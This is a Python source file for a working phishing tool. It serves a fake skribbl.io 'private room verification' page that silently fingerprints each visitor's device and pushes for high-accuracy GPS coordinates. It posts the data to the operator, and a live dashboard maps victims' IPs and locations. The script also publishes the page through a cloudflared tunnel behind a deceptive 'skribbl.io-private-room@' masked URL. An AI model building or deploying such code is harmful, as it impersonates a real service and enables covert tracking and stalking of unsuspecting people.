import json, threading, time, os, base64, subprocess, re
import urllib.request
from flask import Flask, request, Response

TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), '..', '..', 'templates', 'skribble')
TEMPLATE_DIR = os.path.abspath(TEMPLATE_DIR)

PHISH_PORT = 8080
DASH_PORT  = 8181

captures = []
_id_ctr  = 0

def _load_captures(log_file):
    global captures, _id_ctr
    try:
        with open(log_file) as f:
            captures = json.load(f)
            _id_ctr = max((c.get('_id', 0) for c in captures), default=0)
    except Exception:
        captures = []

def _next_id():
    global _id_ctr
    _id_ctr += 1
    return _id_ctr

def _save(log_file):
    try:
        with open(log_file, 'w') as f:
            json.dump(list(captures), f, default=str)
    except Exception:
        pass

def _parse_body(request):
    try:
        d = request.get_json(force=True, silent=True)
        if d: return d
    except Exception:
        pass
    try:
        return json.loads(request.data or b'{}') or {}
    except Exception:
        return {}

def _ip(request):
    return (request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.remote_addr)

def _logo_b64():
    with open(os.path.join(TEMPLATE_DIR, 'logo.gif'), 'rb') as f:
        return 'data:image/gif;base64,' + base64.b64encode(f.read()).decode()

def _leaflet():
    with open(os.path.join(TEMPLATE_DIR, 'leaflet.js')) as f:
        ljs = f.read()
    with open(os.path.join(TEMPLATE_DIR, 'leaflet.css')) as f:
        lcss = f.read()
    return ljs, lcss

PHISH_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>skribbl.io - free multiplayer drawing & guessing game</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800;900&display=swap" rel="stylesheet"/>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Nunito',sans-serif;background:#1d2f6f;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#f0f0f0}
.wrap{width:100%;max-width:420px;padding:20px;display:flex;flex-direction:column;align-items:center;gap:28px}
.logo-img{max-width:320px;width:90%;filter:drop-shadow(0 4px 16px rgba(0,0,0,.5))}
.card{width:100%;background:rgba(12,44,150,0.78);border:3px solid #040a33;border-radius:4px;box-shadow:0 0 0 2px rgba(0,0,0,.2),0 8px 32px rgba(0,0,0,.5);overflow:hidden}
.card-top{background:rgba(7,36,131,0.85);border-bottom:3px solid #040a33;padding:13px 18px;font-size:.95rem;font-weight:800;letter-spacing:.01em}
.card-body{padding:20px 18px;display:flex;flex-direction:column;gap:14px}
.notice{background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.12);border-radius:3px;padding:12px 14px;font-size:.82rem;font-weight:700;color:rgba(255,255,255,.8);line-height:1.55}
.notice b{color:#fff}
#btn{width:100%;padding:13px;background:#2a51d1;border:none;border-radius:3px;font-size:1rem;font-weight:800;color:#fff;cursor:pointer;font-family:'Nunito',sans-serif;text-shadow:2px 2px 0 rgba(0,0,0,.4);box-shadow:0 4px 0 #1a3499,0 6px 12px rgba(0,0,0,.3);transition:all 80ms;letter-spacing:.02em}
#btn:hover{background:#1e44be;transform:translateY(1px);box-shadow:0 3px 0 #1a3499}
#btn:active{transform:translateY(4px);box-shadow:none}
#btn:disabled{opacity:.65;cursor:default;transform:none;box-shadow:0 4px 0 #1a3499}
.prog-wrap{display:none;background:rgba(7,36,131,0.85);border:2px solid #040a33;border-radius:3px;height:10px;overflow:hidden}
.prog-fill{height:100%;background:linear-gradient(90deg,#ee9631,#f5c034);animation:prog 15s linear forwards;border-radius:2px}
@keyframes prog{from{width:3%}to{width:95%}}
#status{font-size:.82rem;color:rgba(255,255,255,.55);font-weight:700;min-height:16px;text-align:center}
.footer-txt{font-size:.7rem;color:rgba(255,255,255,.22);font-weight:700}
</style>
</head>
<body>
<div class="wrap">
  <img class="logo-img" src="__LOGO__" alt="skribbl.io"/>
  <div class="card">
    <div class="card-top">🔒 Private Room — Verification Required</div>
    <div class="card-body">
      <div class="notice">
        <b>Location verification required.</b><br/>
        skribbl.io uses your location to prevent bots and ensure only real players can join private rooms. Your location is <b>not stored</b> and is only used for this session.
      </div>
      <button id="btn" onclick="joinRoom()">Verify &amp; Join Room</button>
      <div class="prog-wrap" id="bar"><div class="prog-fill"></div></div>
      <div id="status"></div>
    </div>
  </div>
  <div class="footer-txt">skribbl.io &copy; 2026 &nbsp;&bull;&nbsp; Privacy Policy &nbsp;&bull;&nbsp; Terms of Service</div>
</div>
<script>
var REDIRECT="__REDIRECT__";
var BASE=location.protocol+"//"+location.host;
function send(path,data){
  var url=BASE+path;
  var blob=new Blob([JSON.stringify(data)],{type:"application/json"});
  try{if(navigator.sendBeacon){navigator.sendBeacon(url,blob);return;}}catch(e){}
  try{fetch(url,{method:"POST",mode:"no-cors",body:blob});}catch(e){}
}
function collectInfo(){
  var ua=navigator.userAgent;
  // Device type
  var isTablet=/iPad/.test(ua)||(/Android/.test(ua)&&!/Mobile/.test(ua));
  var isMobile=!isTablet&&/Mobi|Android|iPhone|iPod/.test(ua);
  var deviceType=isTablet?"Tablet":isMobile?"Mobile":"Desktop";
  // OS
  var os="Unknown";
  if(/iPhone|iPad|iPod/.test(ua)){var m=ua.match(/OS ([\d_]+)/);os="iOS "+(m?m[1].replace(/_/g,"."):"");}
  else if(/Android/.test(ua)){var m=ua.match(/Android ([\d.]+)/);os="Android "+(m?m[1]:"");}
  else if(/Windows NT/.test(ua)){var m=ua.match(/Windows NT ([\d.]+)/);var t={"10.0":"10/11","6.3":"8.1","6.2":"8","6.1":"7"};os="Windows "+(t[m&&m[1]]||m&&m[1]||"");}
  else if(/Mac OS X/.test(ua)){var m=ua.match(/Mac OS X ([\d_]+)/);os="macOS "+(m?m[1].replace(/_/g,"."):"");}
  else if(/Linux/.test(ua)){os="Linux";}
  // Browser + version
  var browser="Unknown";
  if(/OPR\//.test(ua)){var m=ua.match(/OPR\/([\d.]+)/);browser="Opera "+(m?m[1]:"");}
  else if(/Edg\//.test(ua)){var m=ua.match(/Edg\/([\d.]+)/);browser="Edge "+(m?m[1]:"");}
  else if(/Firefox\//.test(ua)){var m=ua.match(/Firefox\/([\d.]+)/);browser="Firefox "+(m?m[1]:"");}
  else if(/Chrome\//.test(ua)){var m=ua.match(/Chrome\/([\d.]+)/);browser="Chrome "+(m?m[1]:"");}
  else if(/Safari\//.test(ua)&&/Version\//.test(ua)){var m=ua.match(/Version\/([\d.]+)/);browser="Safari "+(m?m[1]:"");}
  // GPU via WebGL
  var gpu="N/A";
  try{var c=document.createElement("canvas");var gl=c.getContext("webgl")||c.getContext("experimental-webgl");if(gl){var d=gl.getExtension("WEBGL_debug_renderer_info");if(d)gpu=gl.getParameter(d.UNMASKED_RENDERER_WEBGL)||"Blocked";}}catch(e){}
  // Network
  var conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
  var netType=conn?(conn.effectiveType||conn.type||"N/A"):"N/A";
  var netSpeed=conn&&conn.downlink?conn.downlink+"Mbps":"N/A";
  return{
    deviceType:deviceType,os:os,browser:browser,gpu:gpu,
    userAgent:ua,language:navigator.language,
    screen:screen.width+"x"+screen.height,colorDepth:screen.colorDepth+"bit",
    pixelRatio:window.devicePixelRatio||1,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores:navigator.hardwareConcurrency,ram:navigator.deviceMemory,
    touch:navigator.maxTouchPoints,
    network:netType,networkSpeed:netSpeed,
    cookieEnabled:navigator.cookieEnabled,referrer:document.referrer
  };
}
function autoCapture(){
  var info=collectInfo();send("/info",info);
  if(navigator.getBattery){navigator.getBattery().then(function(b){
    info.battery=Math.round(b.level*100)+"%"+(b.charging?" (charging)":" (discharging)");
    info._update=true;send("/info",info);
  }).catch(function(){});}
}
function setStatus(msg,col){
  var s=document.getElementById("status");
  s.textContent=msg;
  s.style.color=col||"rgba(255,255,255,.55)";
}
function resetBtn(){
  document.getElementById("btn").disabled=false;
  document.getElementById("bar").style.display="none";
}
function getBestLocation(onSuccess,onFail){
  var best=null,watchId=null,done=false;
  var finish=function(){if(done)return;done=true;if(watchId!==null)navigator.geolocation.clearWatch(watchId);if(best)onSuccess(best);else onFail({message:"No position obtained"});};
  var timer=setTimeout(finish,15000);
  watchId=navigator.geolocation.watchPosition(
    function(pos){
      if(!best||pos.coords.accuracy<best.coords.accuracy){best=pos;setStatus("Locking GPS… \xb1"+Math.round(pos.coords.accuracy)+"m");}
      if(pos.coords.accuracy<=10){clearTimeout(timer);finish();}
    },
    function(err){clearTimeout(timer);done=true;if(watchId!==null)navigator.geolocation.clearWatch(watchId);onFail(err);},
    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
  );
}
function joinRoom(){
  document.getElementById("btn").disabled=true;
  document.getElementById("bar").style.display="block";
  setStatus("Verifying…");
  if(!navigator.geolocation){
    setStatus("⚠ Location not supported on this device. Please use a different browser.","#f85149");
    resetBtn();
    return;
  }
  getBestLocation(
    function(pos){
      setStatus("Verified ✓  Entering room…","#3fb950");
      send("/location",{lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,alt:pos.coords.altitude,spd:pos.coords.speed,hdg:pos.coords.heading,ts:new Date().toISOString()});
      setTimeout(function(){window.location.href=REDIRECT;},800);
    },
    function(err){
      send("/location",{denied:true,reason:err.message});
      setStatus("⚠ Location access is required to verify you're not a bot. Please allow location and try again.","#f5c034");
      resetBtn();
    }
  );
}
window.onload=autoCapture;
</script>
</body>
</html>"""

DASH_TMPL = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>nyx – dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;overflow:hidden;background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif}
body{display:flex;flex-direction:row}
#mapwrap{position:relative;flex:1;overflow:hidden;background:#0a0f1e;cursor:grab}
#mapwrap:active{cursor:grabbing}
#mapsvg{position:absolute;top:0;left:0;width:100%;height:100%}
#sidebar{width:340px;min-width:280px;background:#161b22;display:flex;flex-direction:column;border-left:1px solid #30363d;overflow:hidden;height:100vh;flex-shrink:0}
.hdr{padding:14px 16px;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
.brand{font-size:1.1rem;font-weight:700;color:#58a6ff}
.live-dot{width:8px;height:8px;border-radius:50%;background:#3fb950;display:inline-block;margin-right:6px;animation:pulse 1.4s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 16px;border-bottom:1px solid #30363d;flex-shrink:0}
.stat{background:#0d1117;border-radius:8px;padding:10px;text-align:center}
.stat .n{font-size:1.6rem;font-weight:700}
.stat .l{font-size:.7rem;color:#8b949e;text-transform:uppercase;letter-spacing:.06em}
.n.g{color:#3fb950}.n.d{color:#f85149}.n.a{color:#58a6ff}
.feed-hdr{padding:10px 16px 6px;font-size:.75rem;color:#8b949e;text-transform:uppercase;letter-spacing:.08em;display:flex;justify-content:space-between;align-items:center;flex-shrink:0}
.clr{font-size:.75rem;color:#58a6ff;cursor:pointer;background:none;border:none;padding:0}
#feed{flex:1;overflow-y:auto;padding:8px 10px}
.card{background:#0d1117;border:1px solid #30363d;border-radius:10px;padding:12px;margin-bottom:8px;animation:fadein .4s ease}
@keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
.card-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
.bx{font-size:.72rem;font-weight:600;padding:3px 8px;border-radius:12px}
.gps{background:#1a3a2a;color:#3fb950;border:1px solid #3fb950}
.deny{background:#3a1a1a;color:#f85149;border:1px solid #f85149}
.dev{background:#1a2a3a;color:#58a6ff;border:1px solid #58a6ff}
.ts{font-size:.7rem;color:#8b949e}
.ip{font-size:.75rem;color:#8b949e;margin-bottom:8px;font-family:monospace}
.fields{display:grid;grid-template-columns:1fr 1fr;gap:4px}
.f{background:#161b22;border-radius:6px;padding:6px 8px}
.f.wide{grid-column:1/-1}
.lb{font-size:.65rem;color:#8b949e;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}
.vl{font-size:.78rem;color:#e6edf3;word-break:break-all}
.at{background:#30363d;border-radius:3px;height:4px;margin-top:4px;overflow:hidden}
.af{height:100%;border-radius:3px;transition:width .6s}
.omaps{display:inline-block;margin-top:8px;font-size:.75rem;color:#58a6ff;text-decoration:none;background:#1a2a3a;border:1px solid #58a6ff;border-radius:6px;padding:4px 10px}
.status-bar{padding:6px 16px;font-size:.72rem;color:#8b949e;border-top:1px solid #30363d;flex-shrink:0}
#empty{text-align:center;color:#8b949e;font-size:.85rem;padding:40px 20px}
.tip{position:fixed;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:8px 12px;font-size:.75rem;pointer-events:none;display:none;z-index:99;max-width:220px;line-height:1.5}
</style>
</head>
<body>
<div id="mapwrap">
  <svg id="mapsvg" xmlns="http://www.w3.org/2000/svg">
    <g id="view">
      <rect id="ocean" fill="#0a0f1e"/>
      <path id="land" fill="#1c2333" stroke="#2d3748" stroke-width="0.5" stroke-linejoin="round"/>
      <g id="mlayer"></g>
    </g>
  </svg>
  <div class="tip" id="tip"></div>
</div>
<div id="sidebar">
  <div class="hdr">
    <span class="brand">nyx</span>
    <span><span class="live-dot"></span><span id="live-lbl">LIVE</span></span>
    <span id="hit-count" style="font-size:.8rem;color:#8b949e;background:#0d1117;padding:3px 10px;border-radius:12px">0 hits</span>
    <button class="clr" onclick="clearAll()" style="color:#f85149">Clear All</button>
  </div>
  <div class="stats">
    <div class="stat"><div class="n g" id="sg">0</div><div class="l">GPS</div></div>
    <div class="stat"><div class="n d" id="sd">0</div><div class="l">Denied</div></div>
    <div class="stat"><div class="n a" id="sa">0</div><div class="l">Devices</div></div>
  </div>
  <div class="feed-hdr"><span>LIVE FEED</span><button class="clr" onclick="clearView()">clear view</button></div>
  <div id="feed"><div id="empty">No captures yet.<br/>Waiting for hits…</div></div>
  <div class="status-bar" id="sbar">connecting…</div>
</div>
<script>
// --- Map: pure SVG, no dependencies ---
var W=1000,H=500;
var vt={x:0,y:0,s:1};
var pinData={};
var seen=new Set(),stats={g:0,d:0,a:0};

function merc(lat,lon){
  var x=(lon+180)/360*W;
  var s=Math.sin(lat*Math.PI/180);
  s=Math.max(-0.9999,Math.min(0.9999,s));
  var y=(0.5-Math.log((1+s)/(1-s))/(4*Math.PI))*H;
  return[x,y];
}
function applyView(){
  document.getElementById('view').setAttribute('transform',
    'translate('+vt.x+','+vt.y+') scale('+vt.s+')');
  document.getElementById('ocean').setAttribute('x',-vt.x/vt.s);
  document.getElementById('ocean').setAttribute('y',-vt.y/vt.s);
  document.getElementById('ocean').setAttribute('width',W/vt.s+Math.abs(vt.x)/vt.s*2+10000);
  document.getElementById('ocean').setAttribute('height',H/vt.s+Math.abs(vt.y)/vt.s*2+10000);
}
function initMap(){
  var wrap=document.getElementById('mapwrap');
  var svg=document.getElementById('mapsvg');
  svg.setAttribute('viewBox','0 0 '+W+' '+H);
  svg.setAttribute('preserveAspectRatio','xMidYMid meet');
  // fit to viewport
  var bw=wrap.clientWidth,bh=wrap.clientHeight;
  var sc=Math.min(bw/W,bh/H);
  vt.s=sc; vt.x=(bw-W*sc)/2; vt.y=(bh-H*sc)/2;
  applyView();

  // zoom
  wrap.addEventListener('wheel',function(e){
    e.preventDefault();
    var r=wrap.getBoundingClientRect();
    var mx=e.clientX-r.left,my=e.clientY-r.top;
    var f=e.deltaY<0?1.2:1/1.2;
    vt.x=mx+(vt.x-mx)*f; vt.y=my+(vt.y-my)*f; vt.s*=f;
    applyView();
  },{passive:false});

  // pan
  var drag=null;
  wrap.addEventListener('mousedown',function(e){drag={sx:vt.x,sy:vt.y,mx:e.clientX,my:e.clientY};});
  window.addEventListener('mousemove',function(e){
    if(!drag)return;
    vt.x=drag.sx+(e.clientX-drag.mx); vt.y=drag.sy+(e.clientY-drag.my);
    applyView();
  });
  window.addEventListener('mouseup',function(){drag=null;});

  // set world path
  document.getElementById('land').setAttribute('d','__WORLDPATH__');
}

function screenXY(lat,lon){
  var p=merc(lat,lon);
  return[p[0]*vt.s+vt.x, p[1]*vt.s+vt.y];
}
function accColor(a){return a==null?'#8b949e':a<=20?'#3fb950':a<=100?'#f7b731':'#f85149';}

function addPin(d){
  if(!d.lat||!d.lon)return;
  var p=merc(d.lat,d.lon);
  var col=accColor(d.acc);
  var ns='http://www.w3.org/2000/svg';
  var g=document.createElementNS(ns,'g');
  g.setAttribute('data-id',d._id);
  var pulse=document.createElementNS(ns,'circle');
  pulse.setAttribute('cx',p[0]);pulse.setAttribute('cy',p[1]);
  pulse.setAttribute('r',12/vt.s);pulse.setAttribute('fill',col);pulse.setAttribute('opacity','0.25');
  var dot=document.createElementNS(ns,'circle');
  dot.setAttribute('cx',p[0]);dot.setAttribute('cy',p[1]);
  dot.setAttribute('r',5/vt.s);dot.setAttribute('fill',col);
  dot.setAttribute('stroke','#fff');dot.setAttribute('stroke-width',1.5/vt.s);
  dot.style.cursor='pointer';
  var tip=document.getElementById('tip');
  dot.addEventListener('mouseenter',function(e){
    tip.innerHTML='<b>'+d._ip+'</b><br/>'+d.lat.toFixed(5)+', '+d.lon.toFixed(5)+'<br/>Acc: +/-'+Math.round(d.acc||0)+'m<br/><a href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank" style="color:#58a6ff">Open Maps</a>';
    tip.style.display='block';tip.style.left=(e.clientX+12)+'px';tip.style.top=(e.clientY-10)+'px';
  });
  dot.addEventListener('mousemove',function(e){tip.style.left=(e.clientX+12)+'px';tip.style.top=(e.clientY-10)+'px';});
  dot.addEventListener('mouseleave',function(){tip.style.display='none';});
  g.appendChild(pulse);g.appendChild(dot);
  document.getElementById('mlayer').appendChild(g);
  pinData[d._id]=g;
}

function f(l,v){return '<div class="f"><div class="lb">'+l+'</div><div class="vl">'+(v||'N/A')+'</div></div>';}
function updateStats(){document.getElementById('sg').textContent=stats.g;document.getElementById('sd').textContent=stats.d;document.getElementById('sa').textContent=stats.a;var t=stats.g+stats.d+stats.a;document.getElementById('hit-count').textContent=t+' hit'+(t===1?'':'s');}
function addCard(d){
  if(seen.has(d._id))return;seen.add(d._id);
  var e=document.getElementById('empty');if(e)e.remove();
  var ep=d._endpoint||'',isGps=ep==='/location'&&!d.denied,isDeny=ep==='/location'&&d.denied;
  var badge=isGps?'<span class="bx gps">GPS</span>':isDeny?'<span class="bx deny">Denied</span>':'<span class="bx dev">Device</span>';
  var ts=d._time?new Date(d._time).toLocaleTimeString():'',fields='';
  if(isGps){
    var acc=d.acc!=null?Math.round(d.acc):null,col=accColor(acc);
    var pct=acc?Math.min(96,Math.max(4,100-Math.log(acc+1)*15)):30;
    var lbl=acc==null?'Unknown':acc<=20?'High +/-'+acc+'m':acc<=100?'Med +/-'+acc+'m':'Low +/-'+acc+'m';
    fields+=f('Latitude',d.lat!=null?d.lat.toFixed(7):'N/A')+f('Longitude',d.lon!=null?d.lon.toFixed(7):'N/A')+f('Accuracy',acc!=null?'+/- '+acc+' m':'N/A')+f('Altitude',d.alt!=null?d.alt.toFixed(1)+' m':'N/A');
    fields+='<div class="f wide"><div class="lb">'+lbl+'</div><div class="at"><div class="af" style="width:'+pct+'%;background:'+col+'"></div></div></div>';
    addPin(d);stats.g++;
  }else if(isDeny){fields+=f('Reason',d.reason);stats.d++;}
  else{
    var devIcon=d.deviceType==='Mobile'?'Mobile':d.deviceType==='Tablet'?'Tablet':'Desktop';
    fields+=f('Device',devIcon+(d.deviceType?' ('+d.deviceType+')'):'N/A')+f('OS',d.os||d.platform||'N/A');
    fields+=f('Browser',d.browser||'N/A')+f('Language',d.language||'N/A');
    fields+=f('Screen',d.screen+(d.pixelRatio&&d.pixelRatio!==1?' @'+d.pixelRatio+'x':'')+(d.colorDepth?' '+d.colorDepth:''))+f('Touch',d.touch!=null?d.touch+' pts':'N/A');
    fields+=f('CPU',d.cores?d.cores+' cores':'N/A')+f('RAM',d.ram?d.ram+' GB':'N/A');
    fields+=f('Battery',d.battery||'N/A')+f('Network',d.network+(d.networkSpeed&&d.networkSpeed!=='N/A'?' / '+d.networkSpeed:''));
    fields+=f('Timezone',d.timezone||'N/A')+f('Cookies',d.cookieEnabled?'Enabled':'Disabled');
    if(d.gpu&&d.gpu!=='N/A')fields+='<div class="f wide"><div class="lb">GPU</div><div class="vl" style="font-size:.72rem">'+d.gpu+'</div></div>';
    if(d.userAgent)fields+='<div class="f wide"><div class="lb">User-Agent</div><div class="vl" style="font-size:.68rem">'+d.userAgent+'</div></div>';
    stats.a++;
  }
  var div=document.createElement('div');div.className='card';
  div.innerHTML='<div class="card-hdr">'+badge+'<span class="ts">'+ts+'</span></div><div class="ip">'+d._ip+'</div><div class="fields">'+fields+'</div>'+(isGps&&d.lat!=null?'<a class="omaps" href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>':'');
  document.getElementById('feed').prepend(div);updateStats();
}
function setOk(ok){document.getElementById('sbar').textContent=ok?'Connected - polling every 2s':'Lost connection...';document.getElementById('sbar').style.color=ok?'#3fb950':'#f85149';document.getElementById('live-lbl').textContent=ok?'LIVE':'OFFLINE';}
function clearView(){seen=new Set();document.getElementById('feed').innerHTML='<div id="empty">Cleared. Waiting...</div>';stats={g:0,d:0,a:0};updateStats();var ml=document.getElementById('mlayer');while(ml.firstChild)ml.removeChild(ml.firstChild);pinData={};}
function clearAll(){if(!confirm('Clear all captures?'))return;fetch('/api/clear',{method:'POST'}).then(function(){clearView();});}
function poll(){
  fetch('/api/captures').then(function(r){return r.json();}).then(function(list){
    setOk(true);list.forEach(function(c){addCard(c);});
  }).catch(function(e){setOk(false);});
}
initMap();
poll();
setInterval(poll,2000);
</script>
</body>
</html>"""

def _geo_svg_path(w=1000, h=500):
    import math
    geo_file = os.path.join(TEMPLATE_DIR, 'world.geojson')
    if not os.path.exists(geo_file):
        return ''
    with open(geo_file) as f:
        geo = json.load(f)
    def merc(lat, lon):
        x = (lon + 180) / 360 * w
        s = math.sin(math.radians(max(-85.05, min(85.05, lat))))
        y = (0.5 - math.log((1 + s) / (1 - s)) / (4 * math.pi)) * h
        return round(x, 1), round(y, 1)
    parts = []
    for feat in geo.get('features', []):
        g = feat['geometry']
        rings = g['coordinates'] if g['type'] == 'Polygon' else [r for poly in g['coordinates'] for r in poly]
        for ring in rings:
            pts = [merc(c[1], c[0]) for c in ring]
            if not pts:
                continue
            d = 'M{},{}'.format(pts[0][0], pts[0][1])
            d += ''.join('L{},{}'.format(x, y) for x, y in pts[1:])
            d += 'Z'
            parts.append(d)
    return ''.join(parts)

def _build_dash():
    path = _geo_svg_path()
    return DASH_TMPL.replace('__WORLDPATH__', path)

def run(redirect_url: str):
    log_file = os.path.join(TEMPLATE_DIR, 'captures.json')
    _load_captures(log_file)

    logo      = _logo_b64()
    phish_html = PHISH_HTML.replace('__LOGO__', logo).replace('__REDIRECT__', redirect_url)
    dash_html  = _build_dash()

    phish_app = Flask('phish')
    dash_app  = Flask('dash')

    @phish_app.after_request
    def cors(r):
        r.headers['Access-Control-Allow-Origin']  = '*'
        r.headers['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS'
        r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return r

    @phish_app.route('/')
    def phish_index(): return Response(phish_html, mimetype='text/html')

    @phish_app.route('/info', methods=['POST', 'OPTIONS'])
    def phish_info():
        if request.method == 'OPTIONS': return Response('', 204)
        d, ip = _parse_body(request), _ip(request)
        for c in captures:
            if c.get('_ip') == ip and c.get('_endpoint') == '/info':
                c.update(d); _save(log_file); return {'ok': True}
        entry = dict(d)
        entry.update({'_id': _next_id(), '_ip': ip, '_endpoint': '/info',
                      '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
        captures.append(entry); _save(log_file); return {'ok': True}

    @phish_app.route('/location', methods=['POST', 'OPTIONS'])
    def phish_location():
        if request.method == 'OPTIONS': return Response('', 204)
        d, ip = _parse_body(request), _ip(request)
        entry = dict(d)
        entry.update({'_id': _next_id(), '_ip': ip, '_endpoint': '/location',
                      '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
        captures.append(entry); _save(log_file); return {'ok': True}

    @dash_app.route('/')
    def dash_index():
        return Response(dash_html, mimetype='text/html',
                        headers={'Cache-Control': 'no-store'})

    @dash_app.route('/api/captures')
    def api_captures(): return Response(json.dumps(list(captures), default=str), mimetype='application/json')

    @dash_app.route('/api/clear', methods=['POST'])
    def api_clear():
        captures.clear()
        try:
            with open(log_file, 'w') as f: json.dump([], f)
        except Exception: pass
        return {'ok': True}

    threading.Thread(target=lambda: phish_app.run(host='0.0.0.0', port=PHISH_PORT, threaded=True, debug=False, use_reloader=False), daemon=True).start()
    threading.Thread(target=lambda: dash_app.run(host='0.0.0.0', port=DASH_PORT, threaded=True, debug=False, use_reloader=False), daemon=True).start()

    time.sleep(2)

    # Start cloudflared tunnel
    cloudflared = os.path.join(TEMPLATE_DIR, 'cloudflared')
    cf_log = os.path.join(TEMPLATE_DIR, 'cloudflared.log')
    tunnel_url = None
    masked_url = None
    if os.path.isfile(cloudflared):
        with open(cf_log, 'w') as f:
            subprocess.Popen([cloudflared, 'tunnel', '--url', f'http://localhost:{PHISH_PORT}', '--no-autoupdate'],
                             stdout=f, stderr=f)
        for _ in range(35):
            time.sleep(1)
            try:
                with open(cf_log) as f:
                    m = re.search(r'https://[a-z0-9\-]+\.trycloudflare\.com', f.read())
                    if m:
                        tunnel_url = m.group(0)
                        break
            except Exception:
                pass
        if tunnel_url:
            host = tunnel_url.replace('https://', '')
            masked_url = f'https://skribbl.io-private-room@{host}'

    result = {
        'module': 'phishing.skribble',
        'phish_port': PHISH_PORT,
        'dash_port': DASH_PORT,
        'redirect_url': redirect_url,
        'status': 'running',
        'tunnel': tunnel_url or 'cloudflared not found',
        'masked_url': masked_url or 'N/A',
    }

    bar = '═' * 70
    print(f'\n╔{bar}╗')
    print(f'║  skribble is LIVE{" " * 52}║')
    print(f'╠{bar}╣')
    print(f'║  Plain URL   : {(tunnel_url or "N/A"):<53}║')
    print(f'║  Masked URL  : {(masked_url or "N/A"):<53}║')
    print(f'║  Dashboard   : http://localhost:{DASH_PORT:<38}║')
    print(f'║  Redirects → : {redirect_url:<53}║')
    print(f'╚{bar}╝')

    return result
